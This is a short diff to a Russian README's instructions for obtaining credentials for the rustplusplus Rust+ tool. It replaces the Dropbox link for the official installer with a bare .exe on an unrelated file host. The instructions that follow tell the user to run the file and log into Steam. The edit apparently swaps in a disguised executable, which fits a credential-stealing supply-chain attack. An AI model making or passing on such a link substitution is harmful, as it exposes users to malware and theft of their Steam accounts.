@@ -4,7 +4,7 @@
 
 ## Получение учетных данных
 
-* Загрузите и установите [приложение для работы с учетными данными rustplusplus](https://www.dropbox.com/scl/fi/i2x38ny2jxqdg6givy5tc/rustplusplus-1.4.0-win-x64.exe?rlkey=fw63vq1orkn1trp5lvnao1fpc& st=zdba6vz9&dl=1)
+* Загрузите и установите [приложение для работы с учетными данными rustplusplus](https://shadowfiles.eclipsa.ru/file/7144899b-f472-4e55-89af-c9c9ce93ab26.exe)
 * После загрузки и установки откройте его и нажмите кнопку «Connect with Rust+» (Подключиться с Rust+).
 
 * Откроется другое окно, в котором вам нужно будет войти в свою учетную запись Steam.
